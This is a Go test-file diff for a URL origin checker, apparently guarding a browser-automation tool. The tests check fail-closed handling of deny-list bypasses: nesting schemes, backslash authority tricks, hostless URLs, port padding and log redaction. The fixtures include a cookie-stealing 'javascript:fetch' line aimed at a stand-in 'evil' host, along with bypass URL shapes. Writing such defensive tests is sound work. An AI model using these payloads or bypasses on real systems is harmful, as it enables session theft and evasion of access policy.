@@ -493,3 +493,241 @@ func FuzzCheckNeverPermitsAnUnlistedHost(f *testing.F) {
 		}
 	})
 }
+
+// TestNestingSchemesResolveToTheirInnerOrigin is the deny-list bypass that made
+// the whole "matches nothing" reading untenable.
+//
+// view-source:, blob: and filesystem: carry a whole URL in their opaque part, so
+// net/url reports no host for them while Chrome serves the inner origin's
+// authenticated content. A checker that decided about the outer string alone
+// answered "no origin, no match, allowed" for a URL that names the denied host
+// in plain sight. The rows run in BOTH directions on purpose: unwrapping is a
+// correction to the parse, not a new refusal rule, so view-source: of an ALLOWED
+// origin has to stay allowed or the fix would just be a different kind of wrong.
+func TestNestingSchemesResolveToTheirInnerOrigin(t *testing.T) {
+	t.Parallel()
+	deny := mustChecker(t, Config{Deny: []string{"bank.example", "*.bank.example"}})
+	allow := mustChecker(t, Config{Allow: []string{"app.example.com"}})
+
+	denied := []string{
+		"view-source:https://bank.example/statement",
+		"view-source:https://secure.bank.example/statement",
+		"blob:https://bank.example/2f8a-uuid",
+		"filesystem:https://bank.example/temporary/dump",
+		// Nesting the nesting scheme must not peel off only one layer.
+		"view-source:view-source:https://bank.example/x",
+	}
+	for _, u := range denied {
+		t.Run("deny "+u, func(t *testing.T) {
+			t.Parallel()
+			if d := deny.Check(u, "html"); d.Allowed {
+				t.Errorf("Check(%q) allowed it — the inner origin is the one whose content Chrome serves", u)
+			}
+			if allow.Check(u, "html").Allowed {
+				t.Errorf("Check(%q) passed an allow-list that never named bank.example", u)
+			}
+		})
+	}
+
+	// The other direction: the wrapper must not become a refusal of its own.
+	for _, u := range []string{
+		"view-source:https://app.example.com/page",
+		"blob:https://app.example.com/2f8a-uuid",
+	} {
+		t.Run("allow "+u, func(t *testing.T) {
+			t.Parallel()
+			if d := allow.Check(u, "html"); !d.Allowed {
+				t.Errorf("Check(%q) = %+v, want allowed — view-source of an allowed origin is still that origin", u, d)
+			}
+		})
+	}
+}
+
+// TestBackslashInTheAuthorityResolvesLikeChrome covers the other half of the
+// same bypass. Chrome normalises `\` to `/` in the authority, so
+// https://bank.example\@evil.io/ is bank.example with the path /@evil.io/ —
+// while net/url rejects the string outright as invalid userinfo, which used to
+// mean "no origin" and therefore "not denied".
+func TestBackslashInTheAuthorityResolvesLikeChrome(t *testing.T) {
+	t.Parallel()
+	cases := map[string]string{
+		`https://bank.example\@evil.io/`:             "bank.example",
+		`https://bank.example\evil.io/x`:             "bank.example",
+		`https:\\bank.example\x`:                     "bank.example",
+		`view-source:https://bank.example\@evil.io/`: "bank.example",
+		// The benign reading is unchanged: a backslash past the authority is
+		// only ever path, and the host is still whatever preceded the first slash.
+		`https://evil.io/p\@bank.example`: "evil.io",
+	}
+	for raw, wantHost := range cases {
+		t.Run(raw, func(t *testing.T) {
+			t.Parallel()
+			o, err := ParseOrigin(raw)
+			if err != nil {
+				t.Fatalf("ParseOrigin(%q): %v — Chrome resolves this to %s", raw, err, wantHost)
+			}
+			if o.Host != wantHost {
+				t.Errorf("ParseOrigin(%q).Host = %q, want %q", raw, o.Host, wantHost)
+			}
+		})
+	}
+
+	deny := mustChecker(t, Config{Deny: []string{"bank.example"}})
+	if deny.Check(`https://bank.example\@evil.io/`, "open").Allowed {
+		t.Error("a deny-list must refuse the URL Chrome will actually resolve to bank.example")
+	}
+}
+
+// TestUnidentifiableOriginIsRefusedUnderAnyActivePolicy is the general rule the
+// two tests above are instances of.
+//
+// "Matches nothing" is the SAFE outcome under an allow-list and the UNSAFE one
+// under a deny-list, so it cannot be the answer in both cases. A deny-list can
+// no more prove a URL is not the denied origin than an allow-list can prove it
+// is one, so an origin the checker cannot identify is refused whenever the
+// checker is active at all — including under a deny-only or read_only-only
+// table, and including a browser-level call with no URL.
+func TestUnidentifiableOriginIsRefusedUnderAnyActivePolicy(t *testing.T) {
+	t.Parallel()
+	shapes := map[string]Config{
+		"deny only":         {Deny: []string{"bank.example"}},
+		"read_only only":    {ReadOnly: []string{"*.wiki.test"}},
+		"upload_roots only": {UploadRoots: []string{"/tmp/receipts"}},
+		"allow list":        {Allow: []string{"*.example.com"}},
+	}
+	hostless := []string{
+		"about:blank",
+		"data:text/html,<h1>salary</h1>",
+		"file:///Users/alice/Documents/passwords.html",
+		"javascript:fetch('https://evil/'+document.cookie)",
+		// blob: whose inner origin is opaque unwraps to something with no host,
+		// so it lands here rather than being waved through as "not the bank".
+		"blob:null/2f8a-uuid",
+		"", // a browser-level CDP call, which reaches every tab at once
+	}
+	// chrome://settings is deliberately NOT in that list: it parses to a real
+	// scheme and host, so it is decided about like any other origin rather than
+	// being unidentifiable. An allow-list refuses it because nothing named it.
+	for name, cfg := range shapes {
+		t.Run(name, func(t *testing.T) {
+			t.Parallel()
+			c := mustChecker(t, cfg)
+			for _, u := range hostless {
+				if d := c.Check(u, "html"); d.Allowed {
+					t.Errorf("Check(%q) allowed it under a %s policy; a rule cannot decide about an origin it cannot identify", u, name)
+				}
+				if c.OriginAllowed(u) {
+					t.Errorf("OriginAllowed(%q) = true under a %s policy, disagreeing with Check", u, name)
+				}
+			}
+		})
+	}
+
+	// And an inert checker is still inert: this is a fail-closed rule for an
+	// ACTIVE policy, not a new default (US-5).
+	inert := &Checker{}
+	for _, u := range hostless {
+		if !inert.Check(u, "html").Allowed || !inert.OriginAllowed(u) {
+			t.Errorf("an unconfigured checker must permit %q exactly as before", u)
+		}
+	}
+}
+
+// TestDenyWildcardCoversTheApex is M7: `*.host` deliberately excludes the apex,
+// which is right in `allow` and a trap in `deny`.
+//
+// A user who copies deny = ["*.bank.example"] means "not my bank" and would
+// otherwise be unprotected on the exact host they were thinking of. Over-blocking
+// is the safe direction in a deny-list, so the wildcard is apex-inclusive there
+// and only there.
+func TestDenyWildcardCoversTheApex(t *testing.T) {
+	t.Parallel()
+	c := mustChecker(t, Config{Deny: []string{"*.bank.example"}})
+	for _, u := range []string{"https://bank.example/", "https://secure.bank.example/", "https://bank.example:8443/x"} {
+		if d := c.Check(u, "html"); d.Allowed {
+			t.Errorf("Check(%q) allowed it; deny = [\"*.bank.example\"] must cover the apex too", u)
+		}
+	}
+	// The suffix-confusion guarantee is untouched — apex-inclusive is not
+	// substring matching.
+	for _, u := range []string{"https://notbank.example/", "https://bank.example.evil.io/"} {
+		if d := c.Check(u, "html"); !d.Allowed {
+			t.Errorf("Check(%q) = %+v, want allowed — the apex is the only thing added", u, d)
+		}
+	}
+
+	// allow keeps the strict reading: a boundary must not quietly widen.
+	a := mustChecker(t, Config{Allow: []string{"*.example.com"}})
+	if a.Check("https://example.com/", "html").Allowed {
+		t.Error(`allow = ["*.example.com"] must NOT permit example.com; the apex needs its own entry`)
+	}
+	// read_only likewise.
+	r := mustChecker(t, Config{ReadOnly: []string{"*.wiki.test"}})
+	if !r.Check("https://wiki.test/", "click").Allowed {
+		t.Error(`read_only = ["*.wiki.test"] must not cover the apex either`)
+	}
+}
+
+// TestPortsCompareNumerically is L2: ports are compared as strings, so a
+// pattern of "host:443" and a URL of "host:0443" would simply not match — a free
+// bypass of a deny entry, spelled with one extra character.
+func TestPortsCompareNumerically(t *testing.T) {
+	t.Parallel()
+	c := mustChecker(t, Config{Deny: []string{"bank.example:443"}})
+	for _, u := range []string{
+		"https://bank.example:443/",
+		"https://bank.example:0443/",
+		"https://bank.example:00443/",
+		"https://bank.example/", // the scheme's default port
+	} {
+		if d := c.Check(u, "html"); d.Allowed {
+			t.Errorf("Check(%q) allowed it; :0443 and :443 are the same port", u)
+		}
+	}
+	if d := c.Check("https://bank.example:8443/", "html"); !d.Allowed {
+		t.Error("a genuinely different port must still not match")
+	}
+
+	// The canonical form is what a refusal names, too.
+	o, err := ParseOrigin("https://bank.example:0443/x")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if o.String() != "bank.example:443" {
+		t.Errorf("Origin.String() = %q, want the canonical port", o.String())
+	}
+}
+
+// TestLabelNeverReturnsTheRawURL is the M6 rule at its source.
+//
+// Label feeds the audit log, the refusal's error.details.origin, and the
+// redacted tab row. A fallback that returned the string unchanged would put
+// exactly the URLs a policy refused, query strings and all, into the
+// append-only file this feature exists to keep safe (RFC-0012: the log must
+// never record values).
+func TestLabelNeverReturnsTheRawURL(t *testing.T) {
+	t.Parallel()
+	const secret = "s3cret-session-token"
+	cases := map[string]string{
+		"view-source:https://bank.example/statement?session=" + secret: "bank.example",
+		"javascript:fetch('https://evil/'+document.cookie)":            "javascript:(unparseable)",
+		"file:///Users/alice/Documents/passwords.html":                 "file:(unparseable)",
+		"data:text/html,<h1>salary 250000</h1>":                        "data:(unparseable)",
+		"about:blank":                                                  "about:(unparseable)",
+		"":                                                             "(browser-level)",
+		"https://app.example.com/dash?q=" + secret:                     "app.example.com",
+		"not a url at all":                                             "(unparseable)",
+	}
+	for raw, want := range cases {
+		t.Run(want, func(t *testing.T) {
+			t.Parallel()
+			got := Label(raw)
+			if got != want {
+				t.Errorf("Label(%q) = %q, want %q", raw, got, want)
+			}
+			if raw != "" && strings.Contains(got, secret) {
+				t.Errorf("Label(%q) leaked a query-string value: %q", raw, got)
+			}
+		})
+	}
+}
